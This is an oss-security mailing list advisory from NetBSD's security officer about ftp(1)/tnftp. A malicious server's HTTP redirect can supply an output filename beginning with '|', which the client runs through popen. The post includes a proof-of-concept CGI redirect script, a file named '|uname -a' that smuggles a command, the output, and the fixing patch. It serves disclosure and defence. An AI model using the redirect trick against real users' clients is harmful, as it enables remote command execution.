  oss-security - ftp(1) can be made execute arbitrary commands by malicious webserver            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 28 Oct From: Alistair Crooks <agc@...bsd.org> To: oss-security@...ts.openwall.com Cc: security-officer@...bsd.org Subject: ftp(1) can be made execute arbitrary commands by malicious webserver  Hi,  Despite being old, tnftp(1) is quite widely used, hence this request.  Could we get a CVE issued for this one, please?  Sorry about the lack of warning, I wasn't aware of the issue before the fixes were committed to the repo.  FreeBSD and Dragonfly have been informed, as has Apple, and I have received a boilerplate reply from Apple.  The issue is present in (Yosemite).  Thanks, Alistair --- Security Officer, NetBSD   Just a quick heads-up, and sorry that no notice was given - the issue is that a malicious server can cause ftp(1) to execute arbitrary commands:     If you do "ftp http://server/path/file.txt" and don't specify an output    filename with -o, the ftp program can be tricked into executing    arbitrary commands.     The FTP client will follow HTTP redirects, and uses the part of the    path after the last / from the last resource it accesses as the output    filename (as long as -o is not specified).     After it resolves the output filename, it checks to see if the output    filename begins with a "|", and if so, passes the rest to    popen(3):     Here's a simple CGI script that causes ftp to execute "uname -a", the    issue is present on both NetBSD and OSX       a20$ pwd      /var/www/cgi-bin      a20$ ls -l      total 4      -rwxr-xr-x  1 root  wheel  Oct 14 redirect      -rwxr-xr-x  1 root  wheel  Oct 14 |uname -a      a20$ cat redirect      #!/bin/sh      echo 'Status: Found'      echo 'Content-Type: text/html'      echo 'Connection: keep-alive'      echo 'Location:      echo      a20$    a20$ ftp http://localhost/cgi-bin/redirect    Trying ...    ftp: Can't connect to Connection refused    Trying ...    Requesting http://localhost/cgi-bin/redirect    Redirected to    Requesting        32      KiB/s    32 bytes retrieved in KiB/s)    NetBSD a20 NetBSD (CUBIEBOARD) Sun Oct 26    ADT    Jared@...ed-PC:/cygdrive/d/netbsd/src/sys/arch/evbarm/compile/obj/CUBIE    BOARD evbarm    a20$  The issue was found by Jared Mcneill.  Sorry for the lack of notice, I wasn't aware of the issue before fixes were committed to the NetBSD repo.  These fixes are attached to this mail.  Regards, Alistair -- NetBSD Security Officer  Date: Sun, 26 Oct From: Christos Zoulas <christos@...bsd.org> To: source-changes-full@...bsd.org Subject: CVS commit: src/usr.bin/ftp X-Mailer: log_accum  Module Name:	src Committed By:	christos Date:		Sun Oct 26 UTC  Modified Files: 	src/usr.bin/ftp: fetch.c  Log Message: don't pay attention to special characters if they don't come from the command line (from jmcneill)   To generate a diff of this commit: cvs rdiff -u src/usr.bin/ftp/fetch.c  Please note that diffs are not public domain; they are subject to the copyright notices on the relevant files.   Modified files:  Index: src/usr.bin/ftp/fetch.c diff -u --- Nov  6 +++ src/usr.bin/ftp/fetch.c	Sun Oct 26 @@ -1,4 +1,4 @@ -/*	$NetBSD: fetch.c,v christos Exp $	*/ +/*	$NetBSD: fetch.c,v christos Exp $	*/    /*-   * Copyright (c) The NetBSD Foundation, Inc. @@ @@    #include <sys/cdefs.h>  #ifndef lint -__RCSID("$NetBSD: fetch.c,v christos Exp $"); +__RCSID("$NetBSD: fetch.c,v christos Exp $");  #endif /* not lint */    /* @@ @@ fetch_url(const char *url, const char *p  	url_decode(decodedpath);    	if (outfile) -		savefile = ftp_strdup(outfile); +		savefile = outfile;  	else {  		cp = strrchr(decodedpath, '/');		/* find savefile */  		if (cp != NULL) @@ @@ fetch_url(const char *url, const char *p  	rangestart = rangeend = entitylen = -1;  	mtime = -1;  	if (restartautofetch) { -		if (strcmp(savefile, "-") != 0 && *savefile != '|' && -		    stat(savefile, &sb) == 0) +		if (stat(savefile, &sb) == 0)  			restart_point = sb.st_size;  	}  	if (urltype == FILE_URL_T) {		/* file:// URLs */ @@ @@ fetch_url(const char *url, const char *p  		}  	}		/* end of ftp:// or http:// specific setup */   -			/* Open the output file. */ -	if (strcmp(savefile, "-") == 0) { -		fout = stdout; -	} else if (*savefile == '|') { -		oldpipe = xsignal(SIGPIPE, SIG_IGN); -		fout = popen(savefile + 1, "w"); -		if (fout == NULL) { -			warn("Can't execute `%s'", savefile + 1); -			goto cleanup_fetch_url; +	/* Open the output file. */ + +	/* +	 * Only trust filenames with special meaning if they came from +	 * the command line +	 */ +	if (outfile == savefile) { +		if (strcmp(savefile, "-") == 0) { +			fout = stdout; +		} else if (*savefile == '|') { +			oldpipe = xsignal(SIGPIPE, SIG_IGN); +			fout = popen(savefile + 1, "w"); +			if (fout == NULL) { +				warn("Can't execute `%s'", savefile + 1); +				goto cleanup_fetch_url; +			} +			closefunc = pclose;  		} -		closefunc = pclose; -	} else { +	} +	if (fout == NULL) {  		if ((rangeend != -1 && rangeend <= restart_point) ||  		    (rangestart == -1 && filesize != -1 && filesize <= restart_point)) {  			/* already done */ @@ @@ fetch_url(const char *url, const char *p  		(*closefunc)(fout);  	if (res0)  		freeaddrinfo(res0); -	FREEPTR(savefile); +	if (savefile != outfile) +		FREEPTR(savefile);  	FREEPTR(uuser);  	if (pass != NULL)  		memset(pass, 0, strlen(pass));       ----- End forwarded message -----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      